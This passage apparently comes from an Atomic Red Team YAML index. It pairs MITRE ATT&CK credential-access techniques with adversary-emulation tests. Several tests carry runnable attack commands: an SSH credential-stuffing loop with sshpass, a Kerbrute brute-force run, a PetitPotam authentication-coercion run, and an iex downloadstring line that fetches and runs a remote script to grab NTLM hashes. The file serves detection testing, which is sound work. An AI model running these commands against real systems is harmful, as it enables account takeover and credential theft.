      created: '2020-02-11T18:39:59.959Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1110/004
        external_id: T1110.004
      - source_name: US-CERT TA18-068A 2018
        description: US-CERT. (2018, March 27). TA18-068A Brute Force Attacks Conducted
          by Cyber Actors. Retrieved October 2, 2019.
        url: https://www.us-cert.gov/ncas/alerts/TA18-086A
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1110.004
    atomic_tests:
    - name: SSH Credential Stuffing From Linux
      auto_generated_guid: 4f08197a-2a8a-472d-9589-cd2895ef22ad
      description: 'Using username,password combination from a password dump to login
        over SSH.

        '
      supported_platforms:
      - linux
      input_arguments:
        target_host:
          description: IP Address / Hostname you want to target.
          type: string
          default: localhost
      dependency_executor_name: bash
      dependencies:
      - description: 'Requires SSHPASS

          '
        prereq_command: 'if [ -x "$(command -v sshpass)" ]; then exit 0; else exit
          1; fi;

          '
        get_prereq_command: 'if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] ||
          [ $(cat /etc/os-release | grep -i ID=kali) ]; then sudo apt update && sudo
          apt install sshpass -y; else echo "This test requires sshpass" ; fi ;

          '
      executor:
        name: bash
        elevation_required: false
        command: |
          cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/
          for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@#{target_host};done
    - name: SSH Credential Stuffing From MacOS
      auto_generated_guid: d546a3d9-0be5-40c7-ad82-5a7d79e1b66b
      description: 'Using username,password combination from a password dump to login
        over SSH.

        '
      supported_platforms:
      - macos
      input_arguments:
        target_host:
          description: IP Address / Hostname you want to target.
          type: string
          default: localhost
      dependency_executor_name: bash
      dependencies:
      - description: 'Requires SSHPASS

          '
        prereq_command: 'if [ -x "$(command -v sshpass)" ]; then exit 0; else exit
          1; fi;

          '
        get_prereq_command: |
          /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/e8114640740938c20cc41ffdbf07816b428afc49/install.sh)"
          brew install hudochenkov/sshpass/sshpass
      executor:
        name: bash
        elevation_required: false
        command: |
          cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/
          for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@#{target_host};done
    - name: Brute Force:Credential Stuffing using Kerbrute Tool
      auto_generated_guid: 4852c630-87a9-409b-bb5e-5dc12c9ebcde
      description: 'Will read username and password combos from a file or stdin (format
        username:password) and perform a bruteforce attack

        '
      supported_platforms:
      - windows
      input_arguments:
        domaincontroller:
          description: Domain controller where test will be run
          type: string
          default: "$ENV:userdnsdomain"
        domain:
          description: Domain where you will be testing
          type: string
          default: "$ENV:userdomain"
      dependency_executor_name: powershell
      dependencies:
      - description: 'kerbrute.exe must exist in $env:temp

          '
        prereq_command: 'if (test-path $env:temp\kerbrute.exe){exit 0} else {exit
          1}

          '
        get_prereq_command: 'invoke-webrequest "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe"
          -outfile "$env:temp\kerbrute.exe"

          '
      - description: 'bruteforce.txt must exist in $env:temp

          '
        prereq_command: 'if (test-path $env:temp\bruteforce.txt){exit 0} else {exit
          1}

          '
        get_prereq_command: 'invoke-webrequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.004/src/bruteforce.txt?raw=true"
          -outfile "$env:temp\bruteforce.txt"

          '
      executor:
        name: powershell
        elevation_required: false
        command: "cd $env:temp\n.\\kerbrute.exe bruteforce --dc #{domaincontroller}
          -d #{domain} $env:temp\\bruteforce.txt      \n"
  T1208:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Praetorian
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--b39d03cb-7b98-41c4-a878-c40c1a913dc0
      type: attack-pattern
      created: '2018-04-18T17:59:24.739Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1208
        url: https://attack.mitre.org/techniques/T1208
      - url: https://blogs.technet.microsoft.com/motiba/2018/02/23/detecting-kerberoasting-activity-using-azure-security-center/
        description: Bani, M. (2018, February 23). Detecting Kerberoasting activity
          using Azure Security Center. Retrieved March 23, 2018.
        source_name: Microsoft Detecting Kerberoasting Feb 2018
      - url: https://msdn.microsoft.com/library/ms677949.aspx
        description: Microsoft. (n.d.). Service Principal Names. Retrieved March 22,
          2018.
        source_name: Microsoft SPN
      - url: https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spns-setspn-syntax-setspn-exe.aspx
        description: Microsoft. (2010, April 13). Service Principal Names (SPNs) SetSPN
          Syntax (Setspn.exe). Retrieved March 22, 2018.
        source_name: Microsoft SetSPN
      - description: Medin, T. (2014, November). Attacking Kerberos - Kicking the
          Guard Dog of Hades. Retrieved March 22, 2018.
        source_name: SANS Attacking Kerberos Nov 2014
        url: https://redsiege.com/kerberoast-slides
      - url: https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/
        description: Schroeder, W. (2016, November 1). Kerberoasting Without Mimikatz.
          Retrieved March 23, 2018.
        source_name: Harmj0y Kerberoast Nov 2016
      - url: https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1
        description: EmpireProject. (2016, October 31). Invoke-Kerberoast.ps1. Retrieved
          March 22, 2018.
        source_name: Empire InvokeKerberoast Oct 2016
      - url: https://adsecurity.org/?p=2293
        description: Metcalf, S. (2015, December 31). Cracking Kerberos TGS Tickets
          Using Kerberoast ‚Äì Exploiting Kerberos to Compromise the Active Directory
          Domain. Retrieved March 22, 2018.
        source_name: AdSecurity Cracking Kerberos Dec 2015
      modified: '2020-10-20T19:30:10.297Z'
      name: Kerberoasting
      description: |-
        Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service (Citation: Microsoft Detecting Kerberoasting Feb 2018)). (Citation: Microsoft SPN) (Citation: Microsoft SetSPN) (Citation: SANS Attacking Kerberos Nov 2014) (Citation: Harmj0y Kerberoast Nov 2016)

        Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC). (Citation: Empire InvokeKerberoast Oct 2016) (Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials. (Citation: AdSecurity Cracking Kerberos Dec 2015) (Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)

        This same attack could be executed using service tickets captured from network traffic. (Citation: AdSecurity Cracking Kerberos Dec 2015)

        Cracked hashes may enable Persistence, Privilege Escalation, and  Lateral Movement via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078). (Citation: SANS Attacking Kerberos Nov 2014)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: 'Enable Audit Kerberos Service Ticket Operations to log Kerberos
        TGS service ticket requests. Particularly investigate irregular patterns of
        activity (ex: accounts making numerous requests, Event ID 4769, within a small
        time frame, especially if they also request RC4 encryption [Type 0x17]). (Citation:
        Microsoft Detecting Kerberoasting Feb 2018) (Citation: AdSecurity Cracking
        Kerberos Dec 2015)'
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_permissions_required:
      - User
      x_mitre_system_requirements:
      - Valid domain account or the ability to sniff traffic within a domain.
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1556.006:
    technique:
      modified: '2023-02-09T14:18:59.080Z'
      name: Multi-Factor Authentication
      description: "Adversaries may disable or modify multi-factor authentication
        (MFA) mechanisms to enable persistent access to compromised accounts.\n\nOnce
        adversaries have gained access to a network by either compromising an account
        lacking MFA or by employing an MFA bypass method such as [Multi-Factor Authentication
        Request Generation](https://attack.mitre.org/techniques/T1621), adversaries
        may leverage their access to modify or completely disable MFA defenses. This
        can be accomplished by abusing legitimate features, such as excluding users
        from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled
        MFA method, or by manually patching MFA programs and configuration files to
        bypass expected functionality.(Citation: Mandiant APT42)(Citation: Azure AD
        Conditional Access Exclusions)\n\nFor example, modifying the Windows hosts
        file (`C:\\windows\\system32\\drivers\\etc\\hosts`) to redirect MFA calls
        to localhost instead of an MFA server may cause the MFA process to fail. If
        a \"fail open\" policy is in place, any otherwise successful authentication
        attempt may be granted access without enforcing MFA. (Citation: Russians Exploit
        Default MFA Protocol - CISA March 2022) \n\nDepending on the scope, goals,
        and privileges of the adversary, MFA defenses may be disabled for individual
        accounts or for all accounts tied to a larger group, such as all domain accounts
        in a victim's network environment.(Citation: Russians Exploit Default MFA
        Protocol - CISA March 2022) "
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: persistence
      x_mitre_detection: ''
      x_mitre_platforms:
      - Windows
      - Azure AD
      - Office 365
      - SaaS
      - IaaS
      - Google Workspace
      - Linux
      - macOS
      x_mitre_is_subtechnique: true
      x_mitre_deprecated: false
      x_mitre_domains:
      - enterprise-attack
      x_mitre_version: '1.0'
      x_mitre_contributors:
      - Liran Ravich, CardinalOps
      - Muhammad Moiz Arshad, @5T34L7H
      x_mitre_data_sources:
      - 'User Account: User Account Authentication'
      - 'Active Directory: Active Directory Object Modification'
      - 'Logon Session: Logon Session Creation'
      - 'User Account: User Account Modification'
      x_mitre_defense_bypassed:
      - Multi-Factor Authentication
      type: attack-pattern
      id: attack-pattern--b4409cd8-0da9-46e1-a401-a241afd4d1cc
      created: '2022-05-31T19:31:38.431Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1556/006
        external_id: T1556.006
      - source_name: Russians Exploit Default MFA Protocol - CISA March 2022
        description: Cyber Security Infrastructure Agency. (2022, March 15). Russian
          State-Sponsored Cyber Actors Gain Network Access by Exploiting Default Multifactor
          Authentication Protocols and ‚ÄúPrintNightmare‚Ä? Vulnerability. Retrieved May
          31, 2022.
        url: https://www.cisa.gov/uscert/ncas/alerts/aa22-074a
      - source_name: Mandiant APT42
        description: 'Manidant. (n.d.). APT42: Crooked Charms, Cons and Compromise.
          Retrieved September 16, 2022.'
        url: https://www.mandiant.com/media/17826
      - source_name: Azure AD Conditional Access Exclusions
        description: Microsoft. (2022, August 26). Use Azure AD access reviews to
          manage users excluded from Conditional Access policies. Retrieved August
          30, 2022.
        url: https://docs.microsoft.com/en-us/azure/active-directory/governance/conditional-access-exclusion
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1187:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Teodor Cimpoesu
      - Sudhanshu Chauhan, @Sudhanshu_C
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--b77cf5f3-6060-475d-bd60-40ccbf28fdc2
      type: attack-pattern
      created: '2018-01-16T16:13:52.465Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1187
        url: https://attack.mitre.org/techniques/T1187
      - url: https://en.wikipedia.org/wiki/Server_Message_Block
        description: Wikipedia. (2017, December 16). Server Message Block. Retrieved
          December 21, 2017.
        source_name: Wikipedia Server Message Block
      - url: https://blog.didierstevens.com/2017/11/13/webdav-traffic-to-malicious-sites/
        description: Stevens, D. (2017, November 13). WebDAV Traffic To Malicious
          Sites. Retrieved December 21, 2017.
        source_name: Didier Stevens WebDAV Traffic
      - url: https://www.microsoft.com/technet/prodtechnol/WindowsServer2003/Library/IIS/4beddb35-0cba-424c-8b9b-a5832ad8e208.mspx
        description: Microsoft. (n.d.). Managing WebDAV Security (IIS 6.0). Retrieved
          December 21, 2017.
        source_name: Microsoft Managing WebDAV Security
      - url: https://github.com/hob0/hashjacking
        description: Dunning, J. (2016, August 1). Hashjacking. Retrieved December
          21, 2017.
        source_name: GitHub Hashjacking
      - url: https://www.cylance.com/content/dam/cylance/pdfs/white_papers/RedirectToSMB.pdf
        description: Cylance. (2015, April 13). Redirect to SMB. Retrieved December
          21, 2017.
        source_name: Cylance Redirect to SMB
      - url: https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/
        description: Osanda Malith Jayathissa. (2017, March 24). Places of Interest
          in Stealing NetNTLM Hashes. Retrieved January 26, 2018.
        source_name: Osanda Stealing NetNTLM Hashes
      - url: https://www.us-cert.gov/ncas/alerts/TA17-293A
        description: 'US-CERT. (2017, October 20). Alert (TA17-293A): Advanced Persistent
          Threat Activity Targeting Energy and Other Critical Infrastructure Sectors.
          Retrieved November 2, 2017.'
        source_name: US-CERT APT Energy Oct 2017
      modified: '2020-06-19T17:16:41.470Z'
      name: Forced Authentication
      description: |-
        Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.

        The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system. (Citation: Wikipedia Server Message Block) This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.

        Web Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443. (Citation: Didier Stevens WebDAV Traffic) (Citation: Microsoft Managing WebDAV Security)

        Adversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary controlled server. (Citation: GitHub Hashjacking) With access to the credential hash, an adversary can perform off-line [Brute Force](https://attack.mitre.org/techniques/T1110) cracking to gain access to plaintext credentials. (Citation: Cylance Redirect to SMB)

        There are several different ways this can occur. (Citation: Osanda Stealing NetNTLM Hashes) Some specifics from in-the-wild use include:

        * A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)). The document can include, for example, a request similar to <code>file[:]//[remote address]/Normal.dotm</code> to trigger the SMB request. (Citation: US-CERT APT Energy Oct 2017)
        * A modified .LNK or .SCF file with the icon filename pointing to an external reference such as <code>\\[remote address]\pic.png</code> that will force the system to load the resource when the icon is rendered to repeatedly gather credentials. (Citation: US-CERT APT Energy Oct 2017)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: |-
        Monitor for SMB traffic on TCP ports 139, 445 and UDP port 137 and WebDAV traffic attempting to exit the network to unknown external systems. If attempts are detected, then investigate endpoint data sources to find the root cause. For internal traffic, monitor the workstation-to-workstation unusual (vs. baseline) SMB traffic. For many networks there should not be any, but it depends on how systems on the network are configured and where resources are located.

        Monitor creation and modification of .LNK, .SCF, or any other files on systems and within virtual environments that contain resources that point to external network resources as these could be used to gather credentials when the files are rendered. (Citation: US-CERT APT Energy Oct 2017)
      x_mitre_version: '1.2'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Content'
      - 'File: File Access'
      - 'Network Traffic: Network Traffic Flow'
      - 'File: File Modification'
      - 'File: File Creation'
      x_mitre_permissions_required:
      - User
      x_mitre_is_subtechnique: false
      identifier: T1187
    atomic_tests:
    - name: PetitPotam
      auto_generated_guid: 485ce873-2e65-4706-9c7e-ae3ab9e14213
      description: 'This module runs the Windows executable of PetitPotam in order
        to coerce authentication for a remote system.

        '
      supported_platforms:
      - windows
      input_arguments:
        captureServerIP:
          description: Computer IP to use to receive the authentication (ex. attacker
            machine used for NTLM relay)
          type: string
          default: 10.0.0.3
        targetServerIP:
          description: Computer IP to force authentication from (ex. domain controller)
          type: string
          default: 10.0.0.2
        efsApi:
          description: EFS API to use to coerce authentication
          type: integer
          default: 1
        petitpotam_path:
          description: PetitPotam Windows executable
          type: path
          default: "$env:TEMP\\PetitPotam.exe"
      dependency_executor_name: powershell
      dependencies:
      - description: |
          PetitPotam binary must exist on disk and at specified location (#{petitpotam_path}).
          And the computer must be domain joined (implicit authentication).
        prereq_command: 'if (Test-Path "#{petitpotam_path}") { exit 0 } else { exit
          1 }

          '
        get_prereq_command: 'Invoke-WebRequest "https://github.com/topotam/PetitPotam/blob/2ae559f938e67d0cd59c5afcaac67672b9ef2981/PetitPotam.exe?raw=true"
          -OutFile "#{petitpotam_path}"

          '
      executor:
        name: powershell
        elevation_required: false
        command: |
          & "#{petitpotam_path}" #{captureServerIP} #{targetServerIP} #{efsApi}
          Write-Host "End of PetitPotam attack"
    - name: WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS
      auto_generated_guid: 7f06b25c-799e-40f1-89db-999c9cc84317
      description: PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS
        technique via function of WinPwn
      supported_platforms:
      - windows
      executor:
        command: |-
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1')
          Invoke-Internalmonologue -command "-Downgrade true -impersonate true -restore true"
        name: powershell
  T1174:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Vincent Le Toux
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--b8c5c9dd-a662-479d-9428-ae745872537c
      type: attack-pattern
      created: '2018-01-16T16:13:52.465Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1174
        url: https://attack.mitre.org/techniques/T1174
      - url: http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html
        description: Fuller, R. (2013, September 11). Stealing passwords every time
          they change. Retrieved November 21, 2017.
        source_name: Carnal Ownage Password Filters Sept 2013
      - url: https://clymb3r.wordpress.com/2013/09/15/intercepting-password-changes-with-function-hooking/
        description: Bialek, J. (2013, September 15). Intercepting Password Changes
          With Function Hooking. Retrieved November 21, 2017.
        source_name: Clymb3r Function Hook Passwords Sept 2013
      modified: '2020-02-11T19:06:18.818Z'
      name: Password Filter DLL
      description: |-
        Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as dynamic link libraries (DLLs) containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts.

        Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation.

        Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made. (Citation: Carnal Ownage Password Filters Sept 2013)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: |-
        Monitor for change notifications to and from unfamiliar password filters.

        Newly installed password filters will not take effect until after a system reboot.

        Password filters will show up as an autorun and loaded DLL in lsass.exe. (Citation: Clymb3r Function Hook Passwords Sept 2013)
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_permissions_required:
      - Administrator
      - SYSTEM
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1081:
    technique:
      x_mitre_platforms:
      - Windows
      - IaaS
      - Linux
      - macOS
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Microsoft Threat Intelligence Center (MSTIC)
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--ba8e391f-14b5-496f-81f2-2d5ecd646c1c
      type: attack-pattern
      created: '2017-05-31T21:31:02.188Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1081
        url: https://attack.mitre.org/techniques/T1081
      - external_id: CAPEC-639
        source_name: capec
        url: https://capec.mitre.org/data/definitions/639.html
      - url: http://carnal0wnage.attackresearch.com/2014/05/mimikatz-against-virtual-machine-memory.html
        description: CG. (2014, May 20). Mimikatz Against Virtual Machine Memory Part
          1. Retrieved November 12, 2014.
        source_name: CG 2014
      - url: http://blogs.technet.com/b/srd/archive/2014/05/13/ms14-025-an-update-for-group-policy-preferences.aspx
        description: 'Security Research and Defense. (2014, May 13). MS14-025: An
          Update for Group Policy Preferences. Retrieved January 28, 2015.'
        source_name: SRD GPP
      - source_name: Specter Ops - Cloud Credential Storage
        url: https://posts.specterops.io/head-in-the-clouds-bd038bb69e48
        description: Maddalena, C.. (2018, September 12). Head in the Clouds. Retrieved
          October 4, 2019.
      modified: '2021-03-08T10:33:00.910Z'
      name: Credentials in Files
      description: |+
        Adversaries may search local file systems and remote file shares for files containing passwords. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.

        It is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). (Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. (Citation: SRD GPP)

        In cloud environments, authenticated user credentials are often stored in local configuration and credential files. In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files. (Citation: Specter Ops - Cloud Credential Storage)

      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: 'While detecting adversaries accessing these files may be
        difficult without knowing they exist in the first place, it may be possible
        to detect adversary use of credentials they have obtained. Monitor the command-line
        arguments of executing processes for suspicious words or regular expressions
        that may indicate searching for a password (for example: password, pwd, login,
        secure, or credentials). See [Valid Accounts](https://attack.mitre.org/techniques/T1078)
        for more information.'
      x_mitre_version: '1.2'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_permissions_required:
      - User
      - Administrator
      - SYSTEM
      x_mitre_system_requirements:
      - Access to files
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1056:
    technique:
      modified: '2023-03-30T21:01:41.752Z'
      name: Input Capture
      description: Adversaries may use methods of capturing user input to obtain credentials
        or collect information. During normal system usage, users often provide credentials
        to various different locations, such as login pages/portals or system dialog
        boxes. Input capture mechanisms may be transparent to the user (e.g. [Credential
        API Hooking](https://attack.mitre.org/techniques/T1056/004)) or rely on deceiving
        the user into providing input into what they believe to be a genuine service
        (e.g. [Web Portal Capture](https://attack.mitre.org/techniques/T1056/003)).
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_contributors:
      - John Lambert, Microsoft Threat Intelligence Center
      x_mitre_detection: 'Detection may vary depending on how input is captured but
        may include monitoring for certain Windows API calls (e.g. `SetWindowsHook`,
        `GetKeyState`, and `GetAsyncKeyState`)(Citation: Adventures of a Keystroke),
        monitoring for malicious instances of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059),
        and ensuring no unauthorized drivers or kernel modules that could indicate
        keylogging or API hooking are present.'
      x_mitre_domains:
      - enterprise-attack
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      - Network
      x_mitre_version: '1.2'
      x_mitre_data_sources:
      - 'Driver: Driver Load'
      - 'Process: Process Metadata'
      - 'Process: Process Creation'
      - 'File: File Modification'
      - 'Windows Registry: Windows Registry Key Modification'
      - 'Process: OS API Execution'
      x_mitre_permissions_required:
      - Administrator
      - SYSTEM
      - root
      - User
      type: attack-pattern
      id: attack-pattern--bb5a00de-e086-4859-a231-fa793f6797e2
      created: '2017-05-31T21:30:48.323Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1056
        external_id: T1056
      - source_name: Adventures of a Keystroke
        description: 'Tinaztepe,  E. (n.d.). The Adventures of a Keystroke:  An in-depth
          look into keyloggers on Windows. Retrieved April 27, 2016.'
        url: http://opensecuritytraining.info/Keylogging_files/The%20Adventures%20of%20a%20Keystroke.pdf
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1557.002:
    technique:
      x_mitre_platforms:
      - Linux
      - Windows
      - macOS
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Jon Sternstein, Stern Security
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--cabe189c-a0e3-4965-a473-dcff00f17213
      created: '2020-10-15T12:05:58.755Z'
      x_mitre_version: '1.1'
      external_references:
      - source_name: mitre-attack
        external_id: T1557.002
        url: https://attack.mitre.org/techniques/T1557/002
      - source_name: Cylance Cleaver
        url: https://web.archive.org/web/20200302085133/https://www.cylance.com/content/dam/cylance/pages/operation-cleaver/Cylance_Operation_Cleaver_Report.pdf
        description: Cylance. (2014, December). Operation Cleaver. Retrieved September
          14, 2017.
      - source_name: RFC826 ARP
        url: https://tools.ietf.org/html/rfc826
        description: Plummer, D. (1982, November). An Ethernet Address Resolution
          Protocol. Retrieved October 15, 2020.
      - source_name: Sans ARP Spoofing Aug 2003
        url: https://pen-testing.sans.org/resources/papers/gcih/real-world-arp-spoofing-105411
        description: Siles, R. (2003, August). Real World ARP Spoofing. Retrieved
          October 15, 2020.
      x_mitre_deprecated: false
      revoked: false
      description: |
        Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).

        The ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.

        An adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.

        The ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)

        Adversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)
      modified: '2022-07-22T18:37:22.176Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: ARP Cache Poisoning
      x_mitre_detection: "Monitor network traffic for unusual ARP traffic, gratuitous
        ARP replies may be suspicious. \n\nConsider collecting changes to ARP caches
        across endpoints for signs of ARP poisoning. For example, if multiple IP addresses
        map to a single MAC address, this could be an indicator that the ARP cache
        has been poisoned."
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_is_subtechnique: true
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Content'
      - 'Network Traffic: Network Traffic Flow'
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1003.008:
    technique:
      x_mitre_platforms:
      - Linux
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
